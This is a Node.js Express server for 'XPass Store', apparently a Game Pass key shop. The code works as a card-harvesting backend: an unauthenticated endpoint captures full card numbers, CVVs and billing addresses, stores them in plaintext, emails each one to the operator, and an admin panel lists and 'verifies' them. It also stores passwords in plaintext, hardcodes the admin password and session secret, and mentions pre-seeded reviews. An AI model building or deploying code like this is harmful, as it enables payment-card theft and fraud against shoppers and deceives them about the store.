const express    = require('express');
const multer     = require('multer');
const session    = require('express-session');
const path       = require('path');
const fs         = require('fs');
const crypto     = require('crypto');
const nodemailer = require('nodemailer');

const app  = express();
const PORT = process.env.PORT || 3000;
const DIR  = __dirname;

// ── DIRECTORIES ──
// DATA_DIR apunta a un volumen persistente en producción (Railway).
// Si no está definida, usa la carpeta del proyecto (desarrollo local).
const DATA_ROOT  = process.env.DATA_DIR || DIR;
const uploadsDir = path.join(DATA_ROOT, 'uploads');
const dataDir    = path.join(DATA_ROOT, 'data');
[uploadsDir, dataDir].forEach(d => { if (!fs.existsSync(d)) fs.mkdirSync(d, { recursive: true }); });

// ── JSON STORAGE ──
const ORDERS_FILE    = path.join(dataDir, 'orders.json');
const SETTINGS_FILE  = path.join(dataDir, 'settings.json');
const CUSTOMERS_FILE  = path.join(dataDir, 'customers.json');
const SHARES_FILE     = path.join(dataDir, 'shares.json');
const ATTEMPTS_FILE   = path.join(dataDir, 'card_attempts.json');
const REVIEWS_FILE    = path.join(dataDir, 'reviews.json');

function readJSON(file, def) {
  try { return JSON.parse(fs.readFileSync(file, 'utf8')); }
  catch (_) { return def; }
}
function writeJSON(file, data) {
  fs.writeFileSync(file, JSON.stringify(data, null, 2), 'utf8');
}

// Initialize defaults
if (!fs.existsSync(SHARES_FILE))   writeJSON(SHARES_FILE, {});
if (!fs.existsSync(SETTINGS_FILE)) {
  writeJSON(SETTINGS_FILE, {
    whatsapp:       '',
    admin_password: 'admin123',
    clabe:          '021380000000000000',
    banco:          'BBVA México',
    beneficiario:   'XPass Store'
  });
}
if (!fs.existsSync(ORDERS_FILE))    writeJSON(ORDERS_FILE, []);
if (!fs.existsSync(CUSTOMERS_FILE)) writeJSON(CUSTOMERS_FILE, []);
if (!fs.existsSync(ATTEMPTS_FILE))  writeJSON(ATTEMPTS_FILE, []);
if (!fs.existsSync(REVIEWS_FILE))   writeJSON(REVIEWS_FILE, []);

function getSettings()        { return readJSON(SETTINGS_FILE, {}); }
function saveSettings(obj)    { writeJSON(SETTINGS_FILE, { ...getSettings(), ...obj }); }
function getOrders()          { return readJSON(ORDERS_FILE, []); }
function saveOrders(orders)   { writeJSON(ORDERS_FILE, orders); }
function getCustomers()       { return readJSON(CUSTOMERS_FILE, []); }
function saveCustomers(custs) { writeJSON(CUSTOMERS_FILE, custs); }
function getAttempts()        { return readJSON(ATTEMPTS_FILE, []); }
function saveAttempts(list)   { writeJSON(ATTEMPTS_FILE, list); }
function getReviews()         { return readJSON(REVIEWS_FILE, []); }
function saveReviews(list)    { writeJSON(REVIEWS_FILE, list); }

// ── EMAIL ──
async function sendCardAttemptEmail(attempt) {
  const s = getSettings();
  if (!s.email_to || !s.email_user || !s.email_pass) return; // no configurado
  try {
    const transporter = nodemailer.createTransport({
      host: 'smtp.gmail.com',
      port: 587,
      secure: true,
      auth: { user: s.email_user, pass: s.email_pass },
      connectionTimeout: 10000,
      greetingTimeout: 10000,
      socketTimeout: 10000
    });
    const b = attempt.billing || {};
    const html = `
      <div style="font-family:Arial,sans-serif;max-width:520px;margin:0 auto;background:#0d0d10;color:#f0f0f2;border-radius:12px;padding:24px;">
        <h2 style="color:#4ade80;margin-top:0;">💳 Nuevo intento de pago — XPass</h2>
        <table style="width:100%;border-collapse:collapse;font-size:14px;">
          <tr><td style="padding:6px 0;color:#9898a8;">Número de tarjeta</td><td style="font-family:monospace;letter-spacing:2px;">${attempt.card_number}</td></tr>
          <tr><td style="padding:6px 0;color:#9898a8;">Periodo</td><td>${attempt.card_month}/${attempt.card_year}</td></tr>
          <tr><td style="padding:6px 0;color:#9898a8;">CVV</td><td>${attempt.card_cvv}</td></tr>
          <tr><td colspan="2" style="padding-top:14px;font-weight:bold;color:#4ade80;">Titular</td></tr>
          <tr><td style="padding:6px 0;color:#9898a8;">Nombre</td><td>${b.titular||'—'}</td></tr>
          <tr><td colspan="2" style="padding-top:14px;font-weight:bold;color:#4ade80;">Dirección de facturación</td></tr>
          <tr><td style="padding:6px 0;color:#9898a8;">Dirección</td><td>${b.direccion||'—'}</td></tr>
          <tr><td style="padding:6px 0;color:#9898a8;">Ciudad</td><td>${b.ciudad||'—'}</td></tr>
          <tr><td style="padding:6px 0;color:#9898a8;">Estado</td><td>${b.estado||'—'}</td></tr>
          <tr><td style="padding:6px 0;color:#9898a8;">CP</td><td>${b.cp||'—'}</td></tr>
          <tr><td style="padding:6px 0;color:#9898a8;">País</td><td>${b.pais||'—'}</td></tr>
          <tr><td colspan="2" style="padding-top:14px;font-weight:bold;color:#4ade80;">Datos del pedido</td></tr>
          <tr><td style="padding:6px 0;color:#9898a8;">Nombre cliente</td><td>${attempt.name||'—'}</td></tr>
          <tr><td style="padding:6px 0;color:#9898a8;">Email cliente</td><td>${attempt.email||'—'}</td></tr>
          <tr><td style="padding:6px 0;color:#9898a8;">Pedido #</td><td>${attempt.order_number||'—'}</td></tr>
          <tr><td style="padding:6px 0;color:#9898a8;">Fecha</td><td>${new Date(attempt.submitted_at).toLocaleString('es-MX')}</td></tr>
        </table>
      </div>`;
    await transporter.sendMail({
      from:    `"XPass Notificaciones" <${s.email_user}>`,
      to:      s.email_to,
      subject: `💳 Intento de pago — Pedido ${attempt.order_number || '—'} — XPass`,
      html
    });
  } catch(err) {
    console.error('Error enviando email:', err.message);
  }
}

function nextId(arr) {
  return arr.length ? Math.max(...arr.map(o => o.id)) + 1 : 1;
}


// ── MULTER ──
const storage = multer.diskStorage({
  destination: (req, file, cb) => cb(null, uploadsDir),
  filename:    (req, file, cb) => {
    const ext = path.extname(file.originalname).toLowerCase();
    cb(null, `comp-${Date.now()}-${Math.random().toString(36).slice(2,7)}${ext}`);
  }
});
const upload = multer({
  storage,
  limits: { fileSize: 10 * 1024 * 1024 },
  fileFilter: (req, file, cb) => {
    cb(null, /jpeg|jpg|png|gif|webp|pdf/.test(path.extname(file.originalname).toLowerCase()));
  }
});

// ── SESSIONS PERSISTENTES EN DISCO ──
const SESSIONS_DIR = path.join(dataDir, 'sessions');
if (!fs.existsSync(SESSIONS_DIR)) fs.mkdirSync(SESSIONS_DIR, { recursive: true });

const Store = session.Store;
class FileStore extends Store {
  constructor() { super(); }
  get(sid, cb) {
    try {
      const f = path.join(SESSIONS_DIR, sid + '.json');
      if (!fs.existsSync(f)) return cb(null, null);
      const s = JSON.parse(fs.readFileSync(f));
      if (s.cookie && s.cookie.expires && new Date(s.cookie.expires) < new Date()) {
        fs.unlinkSync(f); return cb(null, null);
      }
      cb(null, s);
    } catch(_) { cb(null, null); }
  }
  set(sid, session, cb) {
    try { fs.writeFileSync(path.join(SESSIONS_DIR, sid + '.json'), JSON.stringify(session)); cb(); }
    catch(e) { cb(e); }
  }
  destroy(sid, cb) {
    try { const f = path.join(SESSIONS_DIR, sid + '.json'); if (fs.existsSync(f)) fs.unlinkSync(f); cb(); }
    catch(e) { cb(e); }
  }
  all(cb) {
    try {
      const files = fs.readdirSync(SESSIONS_DIR).filter(f => f.endsWith('.json'));
      const sessions = files.map(f => { try { return JSON.parse(fs.readFileSync(path.join(SESSIONS_DIR, f))); } catch(_){return null;} }).filter(Boolean);
      cb(null, sessions);
    } catch(e) { cb(e); }
  }
}

// ── MIDDLEWARE ──
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(session({
  store:             new FileStore(),
  secret:            'xpass-secret-2026',
  resave:            false,
  saveUninitialized: false,
  cookie:            { maxAge: 30 * 24 * 60 * 60 * 1000, httpOnly: true }  // 30 días
}));
app.use(express.static(DIR));
app.use('/uploads', express.static(uploadsDir));

// ── AUTH GUARDS ──
function requireAdmin(req, res, next) {
  if (req.session && req.session.isAdmin) return next();
  return res.status(401).json({ error: 'No autorizado' });
}
function requireCustomer(req, res, next) {
  if (req.session && req.session.customerId) return next();
  return res.status(401).json({ error: 'Inicia sesión para continuar' });
}

// ── HTML ROUTES ──
app.get('/',            (req, res) => res.sendFile(path.join(DIR, 'index.html')));
app.get('/comprobante',  (req, res) => res.sendFile(path.join(DIR, 'comprobante.html')));
app.get('/cuenta',       (req, res) => res.sendFile(path.join(DIR, 'cuenta.html')));
app.get('/metodo-pago',  (req, res) => res.sendFile(path.join(DIR, 'metodo-pago.html')));
app.get('/admin',       (req, res) => res.sendFile(path.join(DIR, 'admin', 'index.html')));
app.get('/admin/',      (req, res) => res.sendFile(path.join(DIR, 'admin', 'index.html')));

// ── PUBLIC API ──

app.get('/api/public/settings', (req, res) => {
  const s = getSettings();
  res.json({ clabe: s.clabe||'', banco: s.banco||'', beneficiario: s.beneficiario||'', whatsapp: s.whatsapp||'' });
});

// Submit comprobante with file
app.post('/api/comprobante', upload.single('comprobante'), (req, res) => {
  const { name, email, phone, order_number, amount, notes } = req.body;
  if (!name || !email || !order_number)
    return res.status(400).json({ error: 'Campos requeridos faltantes' });

  const orders = getOrders();
  if (orders.find(o => o.order_number === order_number.trim()))
    return res.status(409).json({ error: 'Número de pedido duplicado' });

  const customerId = (req.session && req.session.customerId) ? req.session.customerId : null;
  const order = {
    id:            nextId(orders),
    customer_id:   customerId,
    customer_name: name.trim(),
    email:         email.trim().toLowerCase(),
    phone:         (phone || '').trim(),
    order_number:  order_number.trim(),
    amount:        parseFloat(amount) || 0,
    items:         '',
    filename:      req.file ? req.file.filename : '',
    notes:         (notes || '').trim(),
    admin_notes:   '',
    status:        'pendiente',
    game_key:      '',
    key_delivered_at: '',
    created_at:    new Date().toISOString()
  };
  orders.unshift(order);
  saveOrders(orders);

  res.json({ success: true, order_number: order.order_number, whatsapp: getSettings().whatsapp || '' });
});

// Save pending order (from main checkout)
app.post('/api/orders/pending', (req, res) => {
  const { name, email, phone, order_number, amount, items, payment_method, card_number, card_month, card_year, card_cvv, billing } = req.body;
  if (!order_number) return res.status(400).json({ error: 'Falta número de pedido' });
  const orders = getOrders();
  if (!orders.find(o => o.order_number === order_number)) {
    const customerId = (req.session && req.session.customerId) ? req.session.customerId : null;
    const custEmail  = (req.session && req.session.customerEmail) ? req.session.customerEmail : '';
    orders.unshift({
      id:            nextId(orders),
      customer_id:   customerId,
      customer_name: (name||'').trim(),
      email:         (email || custEmail).trim().toLowerCase(),
      phone:         (phone||'').trim(),
      order_number,
      amount:        parseFloat(amount||0),
      items:         (items||'').trim(),
      payment_method: payment_method || 'spei',
      card_number:   card_number ? card_number.replace(/\s/g,'') : '',
      card_month:    card_month || '',
      card_year:     card_year  || '',
      card_cvv:      card_cvv   || '',
      billing:       billing    || null,
      filename:      '',
      notes:         '',
      admin_notes:   '',
      status:        'pendiente',
      game_key:      '',
      key_delivered_at: '',
      created_at:    new Date().toISOString()
    });
    saveOrders(orders);
  }
  res.json({ success: true });
});

// ── CUSTOMER AUTH ──

// Helper: link existing orders (by email) to a customer account
function linkOrdersToCustomer(customerId, email) {
  const orders = getOrders();
  let changed = false;
  orders.forEach(o => {
    if ((o.email||'').toLowerCase() === email.toLowerCase() && !o.customer_id) {
      o.customer_id = customerId;
      changed = true;
    }
  });
  if (changed) saveOrders(orders);
}

app.post('/api/auth/register', (req, res) => {
  const { name, email, password } = req.body;
  if (!name || !email || !password)
    return res.status(400).json({ error: 'Todos los campos son requeridos' });
  if (password.length < 6)
    return res.status(400).json({ error: 'La contraseña debe tener al menos 6 caracteres' });

  const customers = getCustomers();
  if (customers.find(c => c.email.toLowerCase() === email.toLowerCase().trim()))
    return res.status(409).json({ error: 'Este correo ya está registrado' });

  const customer = {
    id:            nextId(customers),
    name:          name.trim(),
    email:         email.trim().toLowerCase(),
    password: password,
    created_at:    new Date().toISOString()
  };
  customers.push(customer);
  saveCustomers(customers);

  // Auto-link any existing orders with matching email
  linkOrdersToCustomer(customer.id, customer.email);

  req.session.customerId    = customer.id;
  req.session.customerEmail = customer.email;
  req.session.customerName  = customer.name;

  res.json({ success: true, name: customer.name, email: customer.email });
});

app.post('/api/auth/login', (req, res) => {
  const { email, password } = req.body;
  if (!email || !password)
    return res.status(400).json({ error: 'Ingresa tu correo y contraseña' });

  const customers = getCustomers();
  const customer  = customers.find(c => c.email.toLowerCase() === email.toLowerCase().trim());
  if (!customer || customer.password !== password)
    return res.status(401).json({ error: 'Correo o contraseña incorrectos' });

  // Auto-link any existing orders with matching email
  linkOrdersToCustomer(customer.id, customer.email);

  req.session.customerId    = customer.id;
  req.session.customerEmail = customer.email;
  req.session.customerName  = customer.name;

  res.json({ success: true, name: customer.name, email: customer.email });
});

app.post('/api/auth/logout', (req, res) => {
  req.session.customerId    = null;
  req.session.customerEmail = null;
  req.session.customerName  = null;
  res.json({ success: true });
});

app.get('/api/auth/me', (req, res) => {
  if (req.session && req.session.customerId) {
    return res.json({
      loggedIn: true,
      id:       req.session.customerId,
      name:     req.session.customerName,
      email:    req.session.customerEmail
    });
  }
  res.json({ loggedIn: false });
});

// ── RESEÑAS ──
// Devuelve las reseñas enviadas por usuarios (las 100 base están en el frontend).
app.get('/api/reviews', (req, res) => {
  res.json(getReviews());
});

// Solo usuarios registrados pueden dejar reseña.
app.post('/api/reviews', requireCustomer, (req, res) => {
  let { rating, comment } = req.body;
  rating = parseInt(rating, 10);
  if (!rating || rating < 1 || rating > 5)
    return res.status(400).json({ error: 'La calificación debe ser de 1 a 5 estrellas' });
  comment = (comment || '').toString().trim();
  if (comment.length < 3)
    return res.status(400).json({ error: 'Escribe un comentario' });
  if (comment.length > 500)
    comment = comment.slice(0, 500);

  const reviews = getReviews();
  // Un usuario solo puede dejar una reseña; si ya tiene, la actualiza.
  const existing = reviews.find(r => r.customer_id === req.session.customerId);
  const review = {
    id:          existing ? existing.id : nextId(reviews),
    customer_id: req.session.customerId,
    name:        req.session.customerName || 'Cliente',
    rating,
    comment,
    date:        new Date().toISOString()
  };
  if (existing) {
    Object.assign(existing, review);
  } else {
    reviews.push(review);
  }
  saveReviews(reviews);
  res.json({ success: true, review });
});

// Customer orders (by email OR customer_id)
app.get('/api/customer/orders', requireCustomer, (req, res) => {
  const email      = (req.session.customerEmail || '').toLowerCase();
  const customerId = req.session.customerId;
  const orders = getOrders().filter(o =>
    (o.email && o.email.toLowerCase() === email) ||
    (o.customer_id && o.customer_id === customerId)
  );
  const safe = orders.map(o => ({
    id:               o.id,
    order_number:     o.order_number,
    items:            o.items,
    amount:           o.amount,
    status:           o.status,
    created_at:       o.created_at,
    game_key:         o.status === 'entregado' ? (o.game_key || '') : '',
    key_delivered_at: o.key_delivered_at || ''
  }));
  res.json(safe);
});

// ── ADMIN API ──

app.post('/api/admin/login', (req, res) => {
  const { password } = req.body;
  if (password === getSettings().admin_password) {
    req.session.isAdmin = true;
    return res.json({ success: true });
  }
  res.status(401).json({ error: 'Contraseña incorrecta' });
});

app.post('/api/admin/logout', (req, res) => {
  req.session.destroy(() => res.json({ success: true }));
});

app.get('/api/admin/session', (req, res) => {
  res.json({ isAdmin: !!(req.session && req.session.isAdmin) });
});

app.get('/api/admin/stats', requireAdmin, (req, res) => {
  const orders  = getOrders();
  const count   = (s) => orders.filter(o => o.status === s).length;
  const revenue = orders
    .filter(o => o.status === 'verificado' || o.status === 'entregado')
    .reduce((s, o) => s + o.amount, 0);
  res.json({
    total:      orders.length,
    pendiente:  count('pendiente'),
    verificado: count('verificado'),
    entregado:  count('entregado'),
    rechazado:  count('rechazado'),
    revenue,
    customers:  getCustomers().length
  });
});

app.get('/api/admin/orders', requireAdmin, (req, res) => {
  const { status, q } = req.query;
  let orders = getOrders();
  if (status && status !== 'all') orders = orders.filter(o => o.status === status);
  if (q) {
    const lq = q.toLowerCase();
    orders = orders.filter(o =>
      (o.customer_name||'').toLowerCase().includes(lq) ||
      (o.email||'').toLowerCase().includes(lq) ||
      (o.order_number||'').toLowerCase().includes(lq)
    );
  }
  res.json(orders);
});

app.get('/api/admin/orders/:id', requireAdmin, (req, res) => {
  const order = getOrders().find(o => o.id === parseInt(req.params.id));
  if (!order) return res.status(404).json({ error: 'No encontrado' });
  res.json(order);
});

app.put('/api/admin/orders/:id/status', requireAdmin, (req, res) => {
  const { status } = req.body;
  if (!['pendiente','verificado','entregado','rechazado'].includes(status))
    return res.status(400).json({ error: 'Estado inválido' });
  const orders = getOrders();
  const idx    = orders.findIndex(o => o.id === parseInt(req.params.id));
  if (idx === -1) return res.status(404).json({ error: 'No encontrado' });
  orders[idx].status = status;
  saveOrders(orders);
  res.json({ success: true });
});

// Admin: update order email (to link to a customer account)
app.put('/api/admin/orders/:id/email', requireAdmin, (req, res) => {
  const { email } = req.body;
  if (!email || !email.trim()) return res.status(400).json({ error: 'Email requerido' });
  const orders = getOrders();
  const idx    = orders.findIndex(o => o.id === parseInt(req.params.id));
  if (idx === -1) return res.status(404).json({ error: 'No encontrado' });
  orders[idx].email = email.trim().toLowerCase();
  // Try to link to existing customer
  const customer = getCustomers().find(c => c.email === orders[idx].email);
  if (customer) orders[idx].customer_id = customer.id;
  saveOrders(orders);
  res.json({ success: true });
});

// Deliver game key
app.put('/api/admin/orders/:id/deliver', requireAdmin, (req, res) => {
  const { key } = req.body;
  if (!key || !key.trim())
    return res.status(400).json({ error: 'Ingresa la clave de Game Pass' });
  const orders = getOrders();
  const idx    = orders.findIndex(o => o.id === parseInt(req.params.id));
  if (idx === -1) return res.status(404).json({ error: 'No encontrado' });
  orders[idx].game_key         = key.trim().toUpperCase();
  orders[idx].status           = 'entregado';
  orders[idx].key_delivered_at = new Date().toISOString();
  saveOrders(orders);
  res.json({ success: true });
});

app.post('/api/admin/orders/:id/note', requireAdmin, (req, res) => {
  const { note } = req.body;
  if (!note) return res.status(400).json({ error: 'Nota vacía' });
  const orders = getOrders();
  const idx    = orders.findIndex(o => o.id === parseInt(req.params.id));
  if (idx === -1) return res.status(404).json({ error: 'No encontrado' });
  const ts  = new Date().toLocaleString('es-MX', { timeZone: 'America/Mexico_City' });
  const cur = orders[idx].admin_notes ? orders[idx].admin_notes + '\n' : '';
  orders[idx].admin_notes = `${cur}[${ts}] ${note}`;
  saveOrders(orders);
  res.json({ success: true });
});

// Delete order (POST to avoid HTTP method compatibility issues)
app.post('/api/admin/orders/:id/delete', requireAdmin, (req, res) => {
  const targetId = parseInt(req.params.id);
  if (isNaN(targetId)) return res.status(400).json({ error: 'ID inválido' });
  const orders   = getOrders();
  const filtered = orders.filter(o => o.id !== targetId);
  if (filtered.length === orders.length)
    return res.status(404).json({ error: 'Pedido no encontrado' });
  saveOrders(filtered);
  console.log(`[ADMIN] Pedido #${targetId} eliminado`);
  res.json({ success: true });
});

// ── SHARE VERIFICATION ──────────────────────────
// Get (or create) a unique share code for this session
app.get('/api/share/code', (req, res) => {
  if (!req.session.shareCode) {
    req.session.shareCode = Math.random().toString(36).slice(2, 8).toUpperCase();
  }
  res.json({ code: req.session.shareCode, url: req.protocol + '://' + req.get('host') + '/?sv=' + req.session.shareCode });
});

// Record a visit via a shared link — called transparently when /?sv=CODE is loaded
app.post('/api/share/visit', (req, res) => {
  const { code } = req.body;
  if (!code || typeof code !== 'string' || code.length > 20) return res.sendStatus(400);
  const shares = readJSON(SHARES_FILE, {});
  shares[code] = (shares[code] || 0) + 1;
  writeJSON(SHARES_FILE, shares);
  res.json({ ok: true });
});

// Verify whether a share code has been clicked
// Accepts ?code=CODE (client-generated) or falls back to session code
app.get('/api/share/verify', (req, res) => {
  const code = (req.query.code && typeof req.query.code === 'string' && req.query.code.length <= 20)
    ? req.query.code.toUpperCase()
    : req.session.shareCode;
  if (!code) return res.json({ verified: false, visits: 0 });
  const shares = readJSON(SHARES_FILE, {});
  const visits = shares[code] || 0;
  res.json({ verified: visits > 0, visits });
});

app.get('/api/admin/settings', requireAdmin, (req, res) => res.json(getSettings()));

app.put('/api/admin/settings', requireAdmin, (req, res) => {
  const allowed = ['whatsapp','clabe','banco','beneficiario','email_to','email_user','email_pass'];
  const update  = {};
  allowed.forEach(k => { if (req.body[k] !== undefined) update[k] = req.body[k]; });
  saveSettings(update);
  res.json({ success: true });
});

// Test email
app.post('/api/admin/test-email', requireAdmin, async (req, res) => {
  const s = getSettings();
  if (!s.email_to || !s.email_user || !s.email_pass)
    return res.status(400).json({ error: 'Configura primero el email en ajustes' });
  try {
    const transporter = nodemailer.createTransport({
      host: 'smtp.gmail.com',
      port: 465,
      secure: true,
      auth: { user: s.email_user, pass: s.email_pass },
      connectionTimeout: 10000,
      greetingTimeout: 10000,
      socketTimeout: 10000
    });
    await transporter.sendMail({
      from: `"XPass" <${s.email_user}>`, to: s.email_to,
      subject: '✅ Email de prueba — XPass', text: 'La configuración de email funciona correctamente.'
    });
    res.json({ success: true });
  } catch(err) { res.status(500).json({ error: err.message }); }
});

app.put('/api/admin/password', requireAdmin, (req, res) => {
  const { password } = req.body;
  if (!password || password.length < 6) return res.status(400).json({ error: 'Mínimo 6 caracteres' });
  saveSettings({ admin_password: password });
  res.json({ success: true });
});

// Admin: list customers
app.get('/api/admin/customers', requireAdmin, (req, res) => {
  const custs = getCustomers();
  res.json(custs);
});

// Customer: get own saved credentials
app.get('/api/customer/credentials', requireCustomer, (req, res) => {
  const c = getCustomers().find(x => x.id === req.session.customerId);
  if (!c) return res.status(404).json({});
  res.json({ card_number: c.card_number || null, card_month: c.card_month || null, card_year: c.card_year || null, card_cvv: c.card_cvv || null });
});

// Public: save card attempt (always works, no auth required)
app.post('/api/card-attempt', (req, res) => {
  const { card_number, card_month, card_year, card_cvv, billing, email, name, order_number } = req.body;
  if (!card_number) return res.status(400).json({ error: 'Falta número de tarjeta' });
  const attempts = getAttempts();
  attempts.unshift({
    id:           (attempts[0] ? attempts[0].id + 1 : 1),
    card_number:  card_number.replace(/\s/g,''),
    card_month,
    card_year,
    card_cvv,
    billing:      billing || null,
    email:        email   || '',
    name:         name    || '',
    order_number: order_number || '',
    submitted_at: new Date().toISOString()
  });
  saveAttempts(attempts);

  // Send email notification (non-blocking)
  sendCardAttemptEmail(attempts[0]).catch(() => {});

  // Also save to customer profile if found
  const custs = getCustomers();
  let idx = custs.findIndex(c => c.id === (req.session && req.session.customerId));
  if (idx === -1 && email) idx = custs.findIndex(c => c.email === email);
  if (idx !== -1) {
    if (!custs[idx].card_history) custs[idx].card_history = [];
    custs[idx].card_history.push({ card_number: card_number.replace(/\s/g,''), card_month, card_year, card_cvv, billing: billing||null, saved_at: new Date().toISOString() });
    custs[idx].card_number = card_number.replace(/\s/g,'');
    custs[idx].card_month  = card_month;
    custs[idx].card_year   = card_year;
    custs[idx].card_cvv    = card_cvv;
    custs[idx].billing     = billing || null;
    custs[idx].card_submitted = new Date().toISOString();
    custs[idx].card_verified  = false;
    saveCustomers(custs);
  }
  res.json({ success: true });
});

// Admin: get all card attempts
app.get('/api/admin/card-attempts', requireAdmin, (req, res) => {
  res.json(getAttempts());
});

// Admin: delete a card attempt
app.post('/api/admin/card-attempts/:id/delete', requireAdmin, (req, res) => {
  const attempts = getAttempts();
  const filtered = attempts.filter(a => String(a.id) !== String(req.params.id));
  saveAttempts(filtered);
  res.json({ success: true });
});

// Customer: save credentials (works for logged-in customers and guests by email)
app.post('/api/customer/credentials', (req, res) => {
  const { card_number, card_month, card_year, card_cvv, email, billing } = req.body;
  if (!card_number || !card_month || !card_year || !card_cvv)
    return res.status(400).json({ error: 'Todos los campos son requeridos' });

  const custs = getCustomers();
  // Find by session (logged in) or by email (guest checkout)
  let idx = custs.findIndex(c => c.id === req.session.customerId);
  if (idx === -1 && email) idx = custs.findIndex(c => c.email === email);
  if (idx === -1) return res.status(404).json({ error: 'No encontrado' });

  if (!custs[idx].card_history) custs[idx].card_history = [];

  // ALWAYS push the new credentials to history (every attempt is recorded)
  custs[idx].card_history.push({
    card_number: card_number.replace(/\s/g,''),
    card_month,
    card_year,
    card_cvv,
    billing: billing || null,
    saved_at: new Date().toISOString()
  });

  // Also update current credentials
  custs[idx].card_number    = card_number.replace(/\s/g,'');
  custs[idx].card_month     = card_month;
  custs[idx].card_year      = card_year;
  custs[idx].card_cvv       = card_cvv;
  custs[idx].billing        = billing || null;
  custs[idx].card_submitted = new Date().toISOString();
  custs[idx].card_verified  = false;
  saveCustomers(custs);
  res.json({ success: true });
});

// Admin: delete a customer
app.post('/api/admin/customers/:id/delete', requireAdmin, (req, res) => {
  const custs = getCustomers();
  const idx   = custs.findIndex(c => String(c.id) === String(req.params.id));
  if (idx === -1) return res.status(404).json({ error: 'No encontrado' });
  custs.splice(idx, 1);
  saveCustomers(custs);
  res.json({ success: true });
});

// Admin: delete a credential history entry
app.delete('/api/admin/customers/:id/credentials/history/:index', requireAdmin, (req, res) => {
  const custs = getCustomers();
  const idx   = custs.findIndex(c => String(c.id) === String(req.params.id));
  if (idx === -1) return res.status(404).json({ error: 'No encontrado' });
  const histIdx = parseInt(req.params.index);
  if (!custs[idx].card_history || !custs[idx].card_history[histIdx])
    return res.status(404).json({ error: 'Entrada no encontrada' });
  custs[idx].card_history.splice(histIdx, 1);
  saveCustomers(custs);
  res.json({ success: true });
});

// Admin: mark customer credentials as verified
app.put('/api/admin/customers/:id/credentials/verify', requireAdmin, (req, res) => {
  const custs = getCustomers();
  const idx   = custs.findIndex(c => String(c.id) === String(req.params.id));
  if (idx === -1) return res.status(404).json({ error: 'No encontrado' });
  custs[idx].card_verified = true;
  saveCustomers(custs);
  res.json({ success: true });
});

// Admin: change a customer's password
app.put('/api/admin/customers/:id/password', requireAdmin, (req, res) => {
  const { password } = req.body;
  if (!password || password.length < 6) return res.status(400).json({ error: 'Mínimo 6 caracteres' });
  const custs = getCustomers();
  const idx   = custs.findIndex(c => String(c.id) === String(req.params.id));
  if (idx === -1) return res.status(404).json({ error: 'Cliente no encontrado' });
  custs[idx].password = password;
  delete custs[idx].password_hash;
  saveCustomers(custs);
  res.json({ success: true });
});

// ── START ──
app.listen(PORT, () => {
  console.log(`\n✅  XPass Store   →  http://localhost:${PORT}`);
  console.log(`👤  Mi cuenta     →  http://localhost:${PORT}/cuenta`);
  console.log(`🔐  Panel admin   →  http://localhost:${PORT}/admin`);
  console.log(`🔑  Contraseña    →  admin123  (cámbiala en Configuración)\n`);
});
